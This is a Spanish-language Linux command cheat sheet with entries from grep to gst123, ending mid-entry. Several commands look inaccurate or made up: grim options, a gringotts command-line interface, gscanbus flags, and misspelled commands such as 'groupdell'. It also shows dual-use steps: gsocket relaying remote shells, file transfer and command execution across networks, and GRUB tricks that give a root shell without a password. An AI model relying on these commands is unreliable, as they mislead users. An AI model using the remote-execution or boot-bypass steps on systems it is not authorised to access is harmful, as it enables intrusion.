$ grep cups /etc/services (Conocer el puerto por el que corre un servicio)
$ grep 631 /etc/services (Conocer el servicio por el que corre un puerto)
$ grep -s 'palabra' (Suprime los mensajes de error sobre ficheros que no existen o no se pueden leer)
Buscar tres palabras al inicio de la linea [escapando la barra vertical] de un archivo:
	$ mysqldump --help | grep ^routines\|^trigg\|^user -E
1.- Borrar directorios y/o archivos dejando alguno [borrar todo menos DIR3 i los archivos que contengan "archi"]:
$ ls | grep -v DIR3 | grep -v archi | xargs -d"\n" rm -rf


grepcidr
Filtrar direcciones IP que coinciden con una red o una rango CIDR [Classless Inter-Domain Routing].
$ cat blocked_ips.txt | grepcidr 203.0.113.0/24 (con una lista de IPs bloqueadas, ver cuáles están en una red específica)
$ grepcidr -v 192.168.1.0/24 ips.txt (mostrar IPs que no están en la red especificada)
$ echo "192.168.1.100" | grepcidr 192.168.1.0/24 (usado como pipe)
$ grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' /var/log/auth.log | grepcidr 10.0.0.0/8 (filtrar IPs de un log)
$ grepcidr -c 192.168.1.0/24 ips.txt (contar el número de coincidencias)
1.-
Filtrar IPs que pertenecen a una red CIDR
Supongamos un archivo con direcciones IP:
$ cat ips.txt
        192.168.1.10
        10.0.0.5
        172.16.0.20
        192.168.2.30
Y se quiere filtrar solo las IPs que están en la red 192.168.1.0/24:
$ grepcidr 192.168.1.0/24 ips.txt
2.-
Filtrar IPs que coinciden con múltiples redes CIDR
Un archivo con varias redes:
$ cat redes.txt
        192.168.1.0/24
        10.0.0.0/8
Filtrar las IPs que coincidan con alguna de estas redes:
$ grepcidr redes.txt ips.txt


grepmail
Busca en archivos de correo [formatos mbox y Maildir] mensajes que contengan un patrón ya se en el cuerpo como en los encabezados de los correos e imprime los mensajes resultantes.
$ grepmail "factura" ~/correo/INBOX (buscará todos los mensajes en el archivo INBOX que contengan la palabra "factura")
$ grepmail --header "Subject: Oferta" ~/correo/INBOX (busca mensajes cuyo asunto ["Subject"] contenga la palabra "Oferta" en el archivo INBOX)
$ grepmail --body "reunión" ~/correo/INBOX (filtra los mensajes que mencionan "reunión" en el cuerpo del correo)
$ grepmail --after "2025-01-01" --before "2025-03-01" "proyecto" ~/correo/INBOX (muestra mensajes que contienen "proyecto" y enviados entre el 1 de enero y el 1 de marzo de 2025)
$ grepmail "urgente" ~/correo/INBOX.gz (buscar el patrón "urgente" en un archivo de correo comprimido con gzip)


grim
[Generic Image Manipulation]. Utilidad para hacer capturas de pantalla de escritorios Wayland. Escribirá un PNG en un archivo o en la salida estándar.
$ grim -g "$(xwininfo -root | grep 'X:Y' | awk '{print $2,$3}') $(xwininfo -root | grep 'Width:' | awk '{print $2}') $(xwininfo -root | grep 'Height:' | awk '{print $2}')" (capturar toda la pantalla)
$ grim -id <ID_DE_LA_VENTANA> (captura de una ventana específica)
$ grim -n -f screenshot.png --quality=90 (tomará una captura de pantalla sin mostrar la ventana de selección y guardará la imagen como "screenhot.png" con una calidad de compresión del 90%)


grimshot
Es un asistente de shell para crear capturas de pantalla en entornos Wayland, como Sway, utilizando herramientas como grim [tomar la capturas de pantalla], WL-Copy [para copiar imágenes al portapapeles] y slurp [para seleccionar regiones de la pantalla con el cursor].
$ grimshot check (verifica si tienes instalados los componentes necesarios)
$ grimshot save screen ~/screenshot.png (capturar la pantalla completa)
$ grimshot save area ~/selected.png (capturar una región seleccionada. abre un selector para que dibujes el área con el mouse)
$ grimshot copy area (capturar una región y copiarla al portapapeles y pegarla directamente en una app con Ctrl-v)
$ grimshot save window ~/Pictures/window.png (capturar la ventana activa)


gringotts
Herramienta para la gestión segura de contraseñas y otros datos confidenciales como números de tarjetas de crédito, PIN, etc. Utiliza un archivo cifrado para almacenar los datos. Este archivo está protegido por una contraseña maestra que se debe recordar porque todas las entradas dentro de este archivo están cifradas, lo que significa que sin la contraseña maestra, la información es ilegible.
$ gringotts init (inicializar el almacén de datos)
$ gringotts store correo_personal (guardar una nueva contraseña o información)
$ gringotts store cuenta_bancaria "contraseña_secreta" -n "PIN de la tarjeta" (especificar el valor directamente en el comando. La contraseña podría quedar expuesta en el historial)
$ gringotts get correo_personal (acceder a la información almacenada por consola)
$ gringotts get -c correo_personal (copiar el valor al portapapeles)
$ gringotts list (mostrará una lista de los nombres que usados al almacenar la información)
$ gringotts edit correo_personal (abrirá un editor de texto donde se podrá modificar la información)
$ gringotts delete cuenta_bancaria (eliminar una entrada)
$ gringotts passwd (cambiar la contraseña maestra. Pedirá la actual y la nueva)
$ gringotts export backup.json.gpg (exportar los datos a un archivo en formato JSON cifrado)
$ gringotts import backup.json.gpg (importarlos desde un archivo)


grive
[gdrive]. Permite sincronizar cualquier carpeta local con el servicio de almacenamiento online de Google. En Ubuntu: add-apt-repository ppa:nilarimogard/webupd8
$ mkdir grive (crear una carpeta para sincronizar archivos)
$ cd grive (Entrar en la carpeta)
$ grive -a (Mostrará una URL que debe copipastearse al navegador, preferiblemente chromium, y este nos mostrará un código que ha de copipastearse a la consola, tras lo cual empieza el sincronización)
A partir de este momento siempre que entremos en la carpeta gdrive podremos sincronizarla con el almacenamiento de Google lanzando:
$ grive


grok
Herramienta diseñada para analizar texto, especialmente registros [logs] o salidas de programas, usando patrones definidos. La utilidad radica en poder extraer información estructurada de datos no estructurados como logs del sistema, salidas de comandos, etc. Se basa en expresiones regulares simplificadas y nombradas, llamadas patrones Grok, que hacen más fácil reconocer partes específicas del texto, como fechas, direcciones IP, nombres de usuario, etc.
Un patrón Grok se ve así:
        %{IP:client_ip}
Este extrae una dirección IP y la guarda bajo el nombre `client_ip`.
Supongamos este log:
        192.168.1.10 - - [18/May/2025:15:23:12 +0000] "GET /index.html HTTP/1.1" 200 532
Se puede definir un patrón para extraer partes específicas:
$ echo '192.168.1.10 - - [18/May/2025:15:23:12 +0000] "GET /index.html HTTP/1.1" 200 532' \
| grok '%{IP:client} - - \[%{HTTPDATE:timestamp}\] "%{WORD:method} %{URIPATH:request} HTTP/%{NUMBER:http_version}" %{NUMBER:status} %{NUMBER:bytes}'
La salida:
        {
          "client": "192.168.1.10",
          "timestamp": "18/May/2025:15:23:12 +0000",
          "method": "GET",
          "request": "/index.html",
          "http_version": "1.1",
          "status": "200",
          "bytes": "532"
        }
grok ya incluye muchos patrones útiles. Algunos ejemplos:
IP --> Dirección IP
USERNAME --> Nombre de usuario
WORD --> Palabra simple
NUMBER --> Número
HTTPDATE --> Fecha en logs HTTP
URIPATH --> Ruta de URL
1.-
Ejemplo interactivo
        Failed password for invalid user admin from 10.0.0.5 port 2234 ssh2
$ cat log.txt | grok 'Failed password for %{GREEDYDATA:user} from %{IP:ip} port %{NUMBER:port} ssh2'
Salida:
        {
          "user": "invalid user admin",
          "ip": "10.0.0.5",
          "port": "2234"
        }


grokevt
es una colección de scripts escritos en python diseñados para convertir los archivos de registro de eventos [entradas de registro, plantillas de mensajes y archivos de registro] en particiones de Microsoft Windows NT/2000/XP/2003 a un formato legible y analizable en sistemas Linux.
# grokevt-parselog -t /var/lib/grokevt/NOMBRE_DEL_SISTEMA (mostrará una lista de los tipos de registros disponibles: System, Application, Security, etc.)
# grokevt-parselog /var/lib/grokevt/NOMBRE_DEL_SISTEMA Security (ver todos los eventos del registro de seguridad)
# grokevt-parselog /var/lib/grokevt/NOMBRE_DEL_SISTEMA Security | grep '528' (encontrar eventos de inicio de sesión exitosos. event ID 528 en registros de seguridad antiguos)
# grokevt-parselog /var/lib/grokevt/NOMBRE_DEL_SISTEMA Security > security_events.txt (exportar a un archivo para análisis posterior)
# grokevt-parselog /var/lib/grokevt/NOMBRE_DEL_SISTEMA Application | grep 'Error' (análisis de registros de aplicaciones)
# grokevt-parselog /var/lib/grokevt/NOMBRE_DEL_SISTEMA System | grep '2023-04-15' (filtrado por fecha)
1.-
Crear la base de datos de registros
# mkdir /var/lib/grokevt/NOMBRE_DEL_SISTEMA
# grokevt-builddb /mnt/windows /var/lib/grokevt/NOMBRE_DEL_SISTEMA
Este comando explora el sistema de archivos Windows montado, identifica los archivos de registro y construye una base de datos para su análisis.
2.-
Investigación de intrusión donde se necesita verificar intentos de acceso no autorizados:
# mount -o ro,loop,noexec disk_image.dd /mnt/evidence (montar la imagen)
# grokevt-builddb /mnt/evidence /var/lib/grokevt/compromised_system (crea la base de datos de registros)
# grokevt-parselog /var/lib/grokevt/compromised_system Security | grep -E '(529|530|531|532|533|534|535|536|537|539)' (examina eventos de inicio de sesión fallidos)
# grokevt-parselog /var/lib/grokevt/compromised_system Security | grep -E '(624|625|626|636)' (busca eventos de creación de usuarios o cambios en grupos administrativos)


groonga
Es un motor de búsqueda de texto completo [full-text search] y almacén de columnas, diseñado para realizar búsquedas rápidas y eficientes en grandes volúmenes de datos, especialmente en texto. Se utiliza en aplicaciones que requieren búsqueda de texto avanzada, como bases de datos, sistemas de gestión de contenido o aplicaciones web, soporta múltiples idiomas y tiene capacidad para manejar tanto datos estructurados [como columnas] como no estructurados [texto libre]. Está integrado en proyectos como Mroonga [para MySQL] y PGroonga [para PostgreSQL].
$ groonga -n /tmp/mydb.db (crear una nueva base de datos)
$ groonga (entrar en el prompt interactivo)
        > table_create --name Documents --flags TABLE_HASH_KEY --key_type ShortText (crear una tabla de tipo hash para almacenar documentos con claves cortas [ShortText])
        > column_create --table Documents --name content --type Text (crear una columna para almacenar el contenido del documento)
        > table_create --name Terms --flags TABLE_PATRICIA_TRIE --key_type ShortText --default_tokenizer TokenBigram (crear una tabla para el índice de texto completo)
        > column_create --table Terms --name content_index --type Documents --source content (crear un índice para la columna content)
        > select --table Documents --query content:@zorro (buscar documentos que contengan la palabra "zorro")
        > select --table Documents --query "content:@(rápido zorro)" (buscar varias palabras o frases)
        > select --table Documents --query content:@perro --sort_keys _score --output_columns _key,content,_score (ordenar los resultados por relevancia)
$ groonga -s /tmp/mydb.db (iniciar Groonga en modo servidor para aceptar consultas HTTP escuchando en el puerto 10041 por defecto)
$ curl 'http://localhost:10041/d/select?table=Documents&query=content:@zorro' (consultar la base de datos usando un cliente HTTP como curl)
1.-
Insertar datos en en la tabla Documents
$ groonga
        load --table Documents
        [
          {"_key": "doc1", "content": "El rápido zorro marrón salta sobre el perro perezoso."},
          {"_key": "doc2", "content": "Los perros son leales y amigables."},
          {"_key": "doc3", "content": "El zorro es un animal astuto."}
        ]
load --> Inserta múltiples registros en la tabla Documents y cada documento tiene una clave única (_key) y un campo content con texto.
Nota.- La búsqueda de "texto completo" permite buscar palabras o frases dentro de un conjunto de datos de texto, considerando no solo coincidencias exactas, sino también variaciones, sinónimos, o formas flexionadas de las palabras, por ejemplo, "corriendo" y "correr". A diferencia de una búsqueda simple, que busca coincidencias literales y puede ser lenta en grandes conjuntos de datos, la búsqueda de texto completo utiliza "índices invertidos" para acelerar las consultas. Estos índices almacenan un mapeo de palabras a sus ubicaciones en los documentos, lo que permite búsquedas rápidas y relevantes.


gross
Es un servidor de listas grises [Greylisting] que es una técnica utilizada para reducir el spam en servidores de correo electrónico, que temporalmente rechaza cualquier correo de un remitente desconocido. Si el correo es legítimo, el servidor de correo del remitente intentará reenviarlo después de un tiempo, y entonces será aceptado. Los servidores de spam generalmente no intentan reenviar el correo. La configuración en /etc/grossd.conf.
1.-
Integrar gross con Postfix
# nano /etc/postfix/main.cf
y añadir las siguientes líneas:
        # Configuración de milter para Postfix
        smtpd_milters = inet:127.0.0.1:10025
        milter_default_action = accept
# systemctl restart postfix (reiniciar Postfix para aplicar los cambios)
2.-
Integración con Exim
# nano /etc/exim4/exim4.conf.template
y añadir las siguientes líneas:
        # Configuración de milter para Exim
        acl_smtp_mime = acl_check_mime
        acl_smtp_rcpt = acl_check_rcpt
        acl_smtp_data = acl_check_data
# systemctl restart exim4 (reinicia Exim para aplicar los cambios)
3.-
Integración con Sendmail
# nano /etc/mail/sendmail.mc
y añadir las siguientes líneas:
        # Configuración de milter para Sendmail
        INPUT_MAIL_FILTER(`gross', `S=inet:10025@127.0.0.1')
        define(`confMILTER_MACROS_CONNECT', `j, {daemon_name}, {if_name}, {if_addr}')
        define(`confMILTER_MACROS_HELO', `{tls_version}, {cipher}, {cipher_bits}, {cert_subject}, {cert_issuer}')
        define(`confMILTER_MACROS_ENVFROM', `i, {auth_type}, {auth_authen}, {auth_ssf}, {auth_author}, {mail_mailer}, {mail_host}, {mail_addr}')
        define(`confMILTER_MACROS_ENVRCPT', `{rcpt_mailer}, {rcpt_host}, {rcpt_addr}')
# systemctl restart sendmail (reinicia Sendmail para aplicar los cambios)


groupadd
Crear un nuevo grupo
# groupadd oficina


groupdel
Borrar un grupo.
# groupdell oficina


groupmod
Renombrar grupos.
# grouopmod -n nuevo_grupo viejo_grupo


groups
Muestra los grupos a los que pertenece el usuario.
$ groups usuario  (El usuario especificado)
$ groups  (Sin especificar usuario muestra los del usuario con el que estamos)


growisofs
Grabación de dvds.
$ growisofs -Z /dev/sr0=image.iso (graba image.iso en el dispositivo /dev/sr0)
$ growisofs -M /dev/sr0 -R -J /carpeta/con/archivos (añade archivos de /carpeta/con/archivos a un DVD+RW sin borrar el contenido anterior)


grpck
Chequea las sintaxis correcta de los ficheros /etc/group y /etc/gshadow.
# grpck (Una salida vacia indica que todo es correcto)
# grpck -r (gerera un informe)


grterminal
Biblioteca de Golang para generar códigos QR en la terminal.
$ qrterminal https://github.com/mdp/qrterminal -l M (corrección de errores M, "media" por defecto "L")
$ qrterminal http://github.com


grub
[GRand Unified Bootloader]. Gestor de arranque de sistemas operativos del pc.
# update-grub (reconfigurar grub)
# grub-install --root-directory=/media/floppy fd0 (crear un disquete de arranque)
# grub-install --root-directory=/mnt/sda1 --recheck /dev/sda (indica el directorio donde procede grub, parecido al comando anterior)
1.- Si grub no ve algún sistema operativo del pc.
# nano /etc/default/grub
Asegurarse que está decomentada la siguiente linea:
           GRUB_DISABLE_OS_PROBER=false
Y luego:
# apt install os-prober (si no está instalado)
# os-prober (detectar los sitemas operativos del pc)
# grub-mkconfig -o /boot/grub/grub.cfg (entrarlos en grub)
# update-grub (reconfigurar grub)


grub2
Gestor de arranque. Los dispositivos empiezan por 0 y las particiones empiezan con 1. “sda1” es “hd0,1” y no “hd0,0” como en el antiguo grub.
1.-
Modificación de parámetros generales:
# gedit /etc/default/grub
	GRUB_DEFAULT= 0/saved (0 selecciona primera entrada, 1 la segunda... "saved" selecciona la última entrada  ejecutada.)
	GRUB_TIMEOUT=10 (tiempo de espera antes de arrancar)
	GRUB_HIDDEN_TIMEOUT=0  (esconder el menú de entradas. Si hay varios sistemas comentarlo)
	GRUB_HIDDEN_MENU_QUIET=true (oculta la cuenta atrás. "false" la muestra)
	GRUB_DISTRIBUTOR=lsb_release -i -s 2> /dev/null || echo Debian (determina el nombre del sistema)
	GRUB_CMDLINE_LINUX="acpi_osi=Linux" (opciones concretas que pueden pasarse al arranque)
	GRUB_CMDLINE_LINUX_DEFAULT="splash noapic" (otras opciones por defecto)
	GRUB_GFXMODE=1024x768 (activa el grub gráfico)
	GRUB_DISABLE_LINUX_RECOVERY="true" (muestra la opción de recovery mode en el menú. “false lo suprime)
# update-grub2   (hacer efectivos los cambios)
2.-
Para que no aparezca memtest en el menú:
# chmod -x /etc/grub.d/20_memtest86+
El mismo comando con “+x” lo restituye.
# update-grub2
3.-
Quitar lineas que hacen referencia a kernels antiguos:
# dpkg --get-selections | grep linux-image  (averiguar los instalados)
# apt-get remove --purge linux-image-2.6.xx-xx-generic
El update-grub2 se hará de forma automática.
4.-
Cambiar la imagen de fondo [apt-get install grub2-splashimages]. Si se quieren hacer con gimp, estas han de tener un tamaño de  640×480 pixeles y extensión .tga
$ ls /usr/share/images/grub   (directorio de la imágenes)
# gedit /etc/grub.d/05_debian_theme
Y modificamos en la linea:
WALLPAPER="/usr/share/images/grub/Lake_mapourika_NZ.tga"
# update-grub2
5.-
Reinstalar grub2 desde un live-cd o desde otra partición.
# fdisk -l   (para saber la partición del grub que queremos instalar)
# mount /dev/sda2 /media/sda2  (motar la partición)
# mount -o bind /dev/ /media/sda2/dev/  (montar los sistemas de ficheros)
# mount -o bind /sys/ /media/sda2/sys/
# mount -o bind /proc/ /media/sda2/proc/
# chroot /media/sda2    (Chorootear la partición que alberga el grub que vamos a instalar)
# grub-install /dev/sda   (instalar grub en el disco)
6.-
Para solucionar el problema de que al arrancar un sistema operativo la pantalla no muestra nada, editar el archivo:
# nano /etc/default/grub
Y en la linea:
GRUB_CMDLINE_LINUX_DEFAULT="quiet"
Añadir el chipset de vuestra gráfica:
	General (para cualquier gráfica): nomodeset
	ATI (driver libre ati o radeon): radeon.modeset=0
	ATI (driver privativo): nomodeset
	nVidia: xforcevesa o nomodeset
	Nvidia con driver libre (nouveau): nouveau.modeset=0
	Intel: i915.modeset=0
Quedando la entrada, por ejemplo para una Intel; como sigue:
	GRUB_CMDLINE_LINUX_DEFAULT="quiet i915.modeset=0"
7.-
Modificar los colores de las fuentes para adaptarlas a las imágenes mostradas.
# gedit /etc/grub.d/05_debian_theme
y modificar las líneas
set menu_color_normal=white/black
set menu_color_highlight=black/light-gray
color_normal (los que se utilizan por defecto)
color_highlight (los que se utilizan para la entrada seleccionada).
El primero de los 2 colores de cada uno de estos campos se refiere al color de la fuente, y el segundo, al color de fondo.
Colores permitidos:
	red (rojo)
	green (verde)
	blue (azul)
	yellow (amarillo)
	cyan (cian)
	magenta (magenta)
	white (blanco)
	black (negro)
	light-gray (gris claro)
8.-
Colocar contraseña a grub2 para dos usuarios:
# nano /etc/grub.d/00_header
Colocar al final:
cat << EOF
set superusers=”usuario1”
password usuario1 la_contraseña
password usuario2 otra_contraseña
EOF
9.-
Para que en el grub2 salga la partición de windows del sistema pero no otras particiones ntfs (de recuperación, HP, ….)
$ gedit /boot/grub/grub.cfg
Copiar el menuentry perteneciente a la partición windows (no la de recuperación) y pastearla en:
# gedit /etc/grub.d/40_custom
Luego:
# gedit /etc/default/grub
Y añadir al final del archivo la linea:
GRUB_DISABLE_OS_PROBER=true
Recargar grub:
# update-grub
Nota.- Las entradas de 40_custom no se muestran en la salida de la consola pero quedan reflejadas en el grub.cfg
10.-
Poner contraseña a grub2
# grub-mkpasswd-pbkdf2 (Crear la contraseña encriptada en SHA512)
# nano /etc/grub.d/00_header
Y colocar al final del archivo:
cat << EOF
set superusers="usuario"
password_pbkdf2 usuario contraseña_SHA512
EOF
# nano /etc/grub.d/10_linux
Buscar la linea:
printf "menuentry '${title}' ${CLASS} {\n" "${os}" "${version}"
Y colocar al usuario al final de {CLASS}:
printf "menuentry '${title}' ${CLASS} --users usuario {\n" "${os}" "${version}"
# update-grub
11.-
Entrar como root desde grub sin contraseña:
	1.- Cuando sale el menú de grub desplazarse al sistema que se quiere arrancar y pulsar la letra "e"
	2.- moverse a la linea del kernel
En este punto puede optarse por dos soluciones:
	a) borrar todo desde después de "ro" hasta el final y colocar init=/bin/bash [linux   /boot/vmlinuz-3.2.0-4-amd64 root=UUID=de1d7793-c3d2-4e03-b79d-1a76905619e6 ro init=/bin/bash ]. El teclado estará en inglés.
	b) ponemos al final de la linea "single" [linux   /boot/vmlinuz-3.2.0-4-amd64 root=UUID=de1d7793-c3d2-4e03-b79d-1a76905619e6 ro  quiet single ]
Y proseguir con el arranque pulsando F10 o Ctrl+x con lo que el sistema iniciará con una consola root.
12.-
Otra forma de entrar en el sistema cuando se ha perdido la contraseña de root y no se dispone de un live CD:
	1.- Reiniciar y cuando aparece grub, pulsar la tecla "e"
	2.- Buscar la linea en la que aparece algo como "init=/bin/bash" y modificar el parámetro de read-only (ro) por read-write (rw).
	3.- Pulsar F10 para guardar cambios y reiniciar el equipo.
	4.- Aparecerá un prompt shell en el que pondremos:
	    mount -n -o remount,rw /
	    passwd root (ponemos nueva contraseña)
	    exec /sbin/init (reiniciamos)
13.-
Modificar el sistema que arranca primero.
# gedit /boot/grub/grub.cfg
Y modificar la linea que pone:
	set default="2"
Arrancará el sistema situado en la 3ª linea que aparece en el menú (La primera linea es la 0)
14.-
Poner entradas personalizadas en grub.
# nano /etc/grub.d/40_custom
Añadir:
menuentry "Apagar el sistema" {
        echo "Apagan el sistema..."
        halt
}
#
menuentry "Reiniciar eñ sistema" {
        echo "Reinician el sistema..."
        reboot
}
# update-grub2 (recargar)
15.-
Crear un theme personalizado
# nano /etc/default/grub
Añadir al final la linea con la ruta a la imagen que queremos:
       export GRUB_MENU_PICTURE="/home/usuario/imagenes/gnu.jpg"
# mkdir -p /boot/grub/themes/mitema (crea un directorio para el tema)
# cp /home/usuario/imagenes/gnu.jpg /boot/grub/themes/mitema/ (preferible copiar la imagen en el directorio)
Crear el archivo:
# nano /boot/grub/themes/mitema/theme.txt
       # Tema minimalista medio centrado
       desktop-image: "gnu1.jpg"
       terminal-font: "DejaVu Sans Mono 12"
       #
       + boot_menu {
           left = 35%
	   top = 35%
    	   width = 600
    	   height = 300
    	   item_height = 30
    	   item_padding = 2
    	   item_spacing = 5
    	   item_color = "white"
    	   selected_item_color = "yellow"
    	   align = "center"
	}
Indicar a GRUB que use el tema:
# nano /etc/default/grub
Y añadir la línea:
     GRUB_THEME="/boot/grub/themes/mitema/theme.txt"
# update-grub2 (actualizar GRUB)
Reiniciar.


grub-mkconfig
[grub-common]. Generar un fichero de configuración para grub [grub.cfg]
# grub-mkconfig -o /boot/grub/grub.cfg
Despues instalar en el MBR [grub-install /dev/sda]


grub-common
Cargador de arranque unificado que contiene archivos comunes compartidos por las distintas versiones de GRUB. Se comparte entre GRUB Legacy y GRUB 2, aunque aquí se incluyen varios archivos específicos de GRUB 2, siempre que no afecten a GRUB Legacy. Incluye las herramientas grub-editenv, grub-file, grub-fstest, grub-glue-efi, grub-kbdcomp, grub-menulst2cfg, grub-mkfont, grub-mkimage, grub-mklayout, grub-mknetdir, grub-mkpasswd-pbkdf2, grub-mkrelpath, grub-mkrescue, grub-mkstandalone, grub-mount, grub-render-label, grub-script-check, grub-syslinux2cfg, grub-macbless, grub-mkconfig, grub-mkdevicemap y grub-probe.


grub-mkpasswd-pbkdf2
Crear una contraseña para una entrada de grub2
# grub-mkpasswd-pbkdf2
Se entra la contraseña y se confirma. Saldrá una codificación del tipo:
Your PBKDF2 is grub.pbkdf2.sha512.10000.F2FE383.....
Editar grub.cfg
# nano /boot/grub/grub.cfg
Colocar al final de la parte comentada (#):
set superusers="NOMBRE_USUARIO"
password_pbkdf2 NOMBRE_USUARIO grub.pbkdf2.sha512.10000.F2FE383.....
Especificando el nombre del usuario y copipasteando la clave codificada que nos ha dado el comando anterior. Finalmente en la entrada [menuentry] que se quiere proteger inmediatamente después de las comillas ['....'] indicando el nombre del sistema operatico:
	--users NOMBRE_USUARIO
El resultado sería:
menuentry 'Ubuntu, amb Linux 3.2.0-24-generic (mode de restabliment)' --users NOMBRE_USUARIO --class ubuntu --class gnu-linux ....


grun
Lanzador de aplicaciones GTK.


gs
Visualizar y unir archivos pdf y ps [GhostScript].
$ gs archivo.ps
$ gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=1+2.pdf 1.pdf 2.pdf (unir dos pdfs)
$ gs -q -sPAPERSIZE=a4 -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=1+2.pdf 1.pdf 2.pdf  (Especificando medida de página)
$ gs -q -dNOPAUSE -dBATCH -sDEVICE=pswrite -sOutputFile=1+2.ps 1.ps 2.ps (Unir dos ps)


gsasl
[GNU SASL]. Herramienta que permite interactuar con servidores que utilizan el protocolo SASL [Simple Authentication and Security Layer] y establecer una capa de seguridad entre clientes y servidores, especialmente en protocolos como IMAP [correo electrónico], SMTP [envío de correo electrónico], LDAP [directorio] y XMPP [mensajería instantánea].
$ gsasl --mechanism PLAIN --user usuario --password contraseña mail.example.com 143 (probar la autenticación PLAIN con el usuario y contraseña en un servidor IMAP y el puerto 143)
$ gsasl --mechanism LOGIN --user remitente --password secreto smtp.example.com 25 (probar la autenticación LOGIN en un servidor SMTP)
$ gsasl --mechanism DIGEST-MD5 --user otro_usuario --password otra_clave servidor.ejemplo.org 110 (usar un mecanismo más seguro)


gscanbus
Es una pequeña herramienta de escaneo, prueba y visualización de topología de bus para el subsistema IEEE1394 [FireWire], con compatibilidad con AV/C, especialmente para controlar videocámaras y grabadoras de vídeo. Está diseñada como una herramienta de depuración para el desarrollo de IEEE1394, pero también puede utilizarse para comprobar la configuración de IEEE1394 en Linux.
# gscanbus (escaneo básico)
# gscanbus -v (mostrar información detallada sobre los dispositivos)
# gscanbus --device=0x12345678 --target=0x87654321 (probar conexión entre dos dispositivos específicos)
# gscanbus --topology (verificar la topología del bus)
# gscanbus --name="Videocámara" (buscar dispositivos por nombre)
# gscanbus --id-only (mostrar solo el ID de los dispositivos)
# gscanbus --probe=0x12345678 (probar un dispositivo específico)
# gscanbus --cable (encontrar dispositivos conectados en modo "cable", sin encender)


gsettings
Herramienta de configuración. Equivalente a gconftool-2 [gconf-editor] pero para gnome3 [dconf-editor]
$ gsettings set com.canonical.indicator.session show-real-name-on-panel false (Borrar el nombre del panel de unity)
$ gsettings set com.canonical.indicator.sound blacklisted-media-players "['xmms2']" (añadir aplicaciones en el menú de sonido)
Opciones
help (Muestra informacion)
list-schemas (Lista de esquemas instalados)
list-relocatable-schemas (Lista los que pueden ser modificados)
list-keys (Lista las claves de un esquema)
list-children	 (lista los procesos hijos de un esquema)
list-recursively (Lista claves y valores recursivamente)
range (Consulta el rango de la clave)
get (Obtine el valor de una clave)
set (Establece el valor de una clave)
reset (Reinicia el valor de la clave)
reset-recursively (Reinicia los valores de todo un esquema)
writable (Comprueba si un clave es modificable)
monitor (Hace un seguimiento por si hay cambios)


gsm-utils
Herramientas para interactuar con dispositivos GSM [teléfonos móviles antiguos o módems GSM]. Las funciones incluyen: modificación de agendas telefónicas, lectura, escritura, envío y recepción de mensajes SMS.
$ gsmsendsms -d /dev/ttyUSB0 +34666777888 "Este es un mensaje de prueba" (enviar un SMS. Especifica el dispositivo del módem, número de destino y mensaje)
$ gsmsms -d /dev/ttyUSB0 -r (mostrará los mensajes recibidos en el dispositivo)
$ gsmsms -d /dev/ttyUSB0 -d 5  (borrar el mensaje con índice 5)
$ gsmpb -d /dev/ttyUSB0 -l (listar contactos)
$ gsmpb -d /dev/ttyUSB0 -a "Juan Perez" +34987654321 (añadir un contacto)


gsocket
Herramienta gsocket [Global Socket], que permite establecer conexiones seguras entre dos máquinas en redes diferentes sin necesidad de conocer sus direcciones IP, la ubicación geográfica o puerto. Funciona mediante un servidor de rendezvous público o privado que actúa como intermediario [gsocket server], y utiliza una clave secreta compartida para emparejar las conexiones. Los datos se cifran con TLS, similar a SSH. Incluye las herramientas gs-netcat, gs-sftp, gs-mount y blitz
$ gsocket -s mi-clave-secreta (ambas máquinas lo ejecutan y se abrirá una terminal compartida en cada una de ellas donde lo que escriba una lo verá la otra)
$ gsocket -s mi-clave-secreta -f < archivo.txt (máquina emisora envía archivo)
$ gs-netcat -s "mi-clave-secreta" < archivo_local.txt (lo mismo)
$ gsocket -s mi-clave-secreta -f > archivo_recibido.txt (máquina receptora recibe archivo)
$ gs-netcat -s "mi-clave-secreta" -l > archivo_recibido.txt (lo mismo)
$ gsocket -s mi-clave-secreta -t -l 8080 (máquina servidor escucha en puerto local 8080)
$ gs-netcat -s "mi-clave-secreta" -l -p 2222 (lo mismo en el puerto 2222)
$ gsocket -s mi-clave-secreta -t 127.0.0.1:8080 (máquina cliente conecta al túnel)
$ gs-netcat -s "mi-clave-secreta" -p 2222 (lo mismo)
$ gsocket -s mi-clave-secreta -i (máquina servidor espera conexión)
$ gsocket -s mi-clave-secreta -e "ls -l /" (máquina cliente ejecuta un comando en remoto)
$ gs-sftp -s "mi-clave-secreta" (crea un servidor SFTP [SSH File Transfer Protocol] temporal sin necesidad de configurar sshd)
$ sftp -P 33001 -i ~/.gsocket/gs-sftp.id_rsa localhost (cliente accede al directorio compartido)
$ gs-mount -s "mi-clave-secreta" /tmp (servidor comparte /tmp)
$ gs-mount -s "mi-clave-secreta" ~/remoto (cliente monta el directorio en ~/remoto y en el cliente refleja el contenido de /tmp del servidor)
$ blitz -s "mi-clave-secreta" -l (modo escucha en todas las máquinas)
$ blitz -s "mi-clave-secreta" -c "uname -a" (desde una máquina ejecuta un comando en todas y todas responderán con su versión del kernel)


gss-man
Páginas de manual de GSS [Generic Security Service]. Es una implementación libre del marco de seguridad GSS-API [[Generic Security Services - Application Program Interface]] que permite a las aplicaciones acceder a servicios de seguridad como autenticación, integridad y confidencialidad, sin importar qué protocolo específico se use debajo. El comando simplemente muestra las páginas del manual relacionadas con las funciones y conceptos de la GSS-API como un ayudante para acceder a la documentación de GSS.
$ gss-man gss_init_sec_context (abrirá la página de manual que describe la función gss_init_sec_context)
$ gss-man gss_acquire_cred (muestra el manual de la función gss_acquire_cred)


gssdp-tools
Una API basada en GObject para ejecutar SSDP [Simple Service Discovery Protocol - Protocolo Simple de Descubrimiento de Servicios] y descubrir dispositivos y servicios disponibles en una red local, por ejemplo, smart TVs, impresoras, cámaras IP, etc.
$ gssdp-device-sniffer (escanea la red y muestra en tiempo real los dispositivos SSDP anunciándose)
$ gssdp-device-sniffer --interface=eth0 (escanear en una interfaz específica)
$ gssdp-device-sniffer --target=239.255.255.250 (enviar consultas M-SEARCH a un objetivo personalizado)


gst123
Reproductor de archivos de audio/vídeo, similar a ogg123 y mpg123, basado en GStreamer.
$ gst123 file.mp3 (reproducir un archivo MP3)
$ gst123 --volume=50% file.mp3 (reproducir con volumen ajustado)
$ gst123 file.avi (reproducir un archivo AVI)
$ gst123 http://example.com/audio.mp3 (reproducir desde una URL)
$ gst123 --loop file.mp3 (reproducir en bucle)
$ gst123 --info file.mp3 (mostrar información sobre el archivo mientras se reproduce)


gt5
